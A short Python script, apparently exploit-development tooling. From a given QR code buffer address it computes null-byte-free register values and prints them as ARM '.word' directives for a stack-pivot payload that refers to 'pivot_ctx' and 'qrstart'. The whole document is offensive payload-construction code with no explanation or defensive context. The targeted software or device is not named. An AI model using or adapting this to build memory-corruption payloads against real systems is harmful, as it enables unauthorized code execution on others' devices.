#!/usr/bin/env python3

from sys import argv
if len(argv) < 2:
	print("Usage: %s [qr buffer address]" % (argv[0]))
	exit()

a = int(argv[1], 16)

bias = 0x01010100 # to avoid having a null byte in the top byte of r7
r4 = 0x01ffffff - (bias >> 7) # 0x01ffffff << 7 = 0xffffff80
r7 = a + bias + 0x80 # r0 = (r4<<7) + r7 , we add 0x80 here as 0xffffff80 + 0x80 = 0x100000000
r5 = (a - (r4 << 2)) & 0xffffffff # r6 = (r4<<2) + r5

print(".word 0x%08x" % r4)
print(".word 0x%08x + (pivot_ctx-qrstart) + 8 - 0x8c" % r5)
print(".word GARBAGE")
print(".word 0x%08x + (pivot_ctx-qrstart)" % r7)